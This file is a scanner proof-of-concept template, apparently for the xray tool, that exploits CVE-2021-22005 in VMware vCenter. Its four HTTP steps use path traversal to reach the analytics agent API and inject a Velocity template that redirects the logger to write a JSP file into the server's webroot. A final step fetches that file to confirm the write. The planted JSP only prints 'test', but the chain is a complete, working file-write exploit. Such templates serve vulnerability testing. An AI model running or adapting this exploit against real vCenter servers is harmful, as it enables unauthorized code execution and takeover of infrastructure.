name: poc-yaml-vmware-vcenter-cve-2021-22005
transport: http
set:
  agent_param: randomLowercase(6)
  filename: randomLowercase(6)
  log_param: randomLowercase(6)
rules:
  r0:
    request:
      method: GET
      path: /analytics/telemetry/ph/api/level?_c=test
      follow_redirects: false
    expression: >-
      response.status == 200 && !response.body.bcontains(b"OFF") ||
      response.status == 400
  r1:
    request:
      method: POST
      path: >-
        /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c={{agent_param}}&_i={{log_param}}
      follow_redirects: false
      headers:
        Content-Type: application/json
        X-Deployment-Secret: abc
      body: >-
        {"manifestSpec": {}, "objectType": "a2", "collectionTriggerDataNeeded":
        true, "deploymentDataNeeded": true, "resultNeeded": true,
        "signalCollectionCompleted": true, "localManifestPath": "a7",
        "localPayloadPath": "a8", "localObfuscationMapPath": "a9"}
    expression: response.status == 201
  r2:
    request:
      method: POST
      path: >-
        /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={{agent_param}}&_i={{log_param}}
      follow_redirects: false
      headers:
        X-Deployment-Secret: abc
        Content-Type: application/json
      body: >-
        {"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n       <request>\n          <query name=\"vir:VCenter\">\n             <constraint>\n                <targetType>ServiceInstance</targetType>\n             </constraint>\n             <propertySpec>\n                <propertyNames>content.about.instanceUuid</propertyNames>\n                <propertyNames>content.about.osType</propertyNames>\n                <propertyNames>content.about.build</propertyNames>\n                <propertyNames>content.about.version</propertyNames>\n             </propertySpec>\n          </query>\n       </request>\n       <cdfMapping>\n          <indepedentResultsMapping>\n             <resultSetMappings>\n                <entry>\n                   <key>vir:VCenter</key>\n                   <value>\n                      <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                         <resourceItemToJsonLdMapping>\n                            <forType>ServiceInstance</forType>\n                         <mappingCode><![CDATA[    \n                            #set($appender = $GLOBAL-logger.logger.parent.getAppender(\"LOGFILE\"))##\n                            #set($orig_log = $appender.getFile())##\n                            #set($logger = $GLOBAL-logger.logger.parent)##     \n                            $appender.setFile(\"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/{{filename}}.jsp\")##     \n                            $appender.activateOptions()##  \n                            $logger.warn(\"\\u003c\\u0025\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0022\\u0074\\u0065\\u0073\\u0074\\u0022\\u0029\\u003b\\u0025\\u003e\")##   \n                            $appender.setFile($orig_log)##     \n                            $appender.activateOptions()##]]>\n                         </mappingCode>\n                         </resourceItemToJsonLdMapping>\n                      </value>\n                   </value>\n                </entry>\n             </resultSetMappings>\n          </indepedentResultsMapping>\n       </cdfMapping>\n       <requestSchedules>\n          <schedule interval=\"1h\">\n             <queries>\n                <query>vir:VCenter</query>\n             </queries>\n          </schedule>\n       </requestSchedules>\n    </manifest>", "objectId": "a2"}
    expression: >-
      response.status == 200
  r3:
    request:
      method: GET
      path: /idm/..;/{{filename}}.jsp
      follow_redirects: false
    expression: response.status == 200 && response.body_string.contains("test")
expression: r0() && r1() && r2() && r3()
detail:
  author: Rainmaker
  links: [https://blog.csdn.net/m0_58596609/article/details/121610029]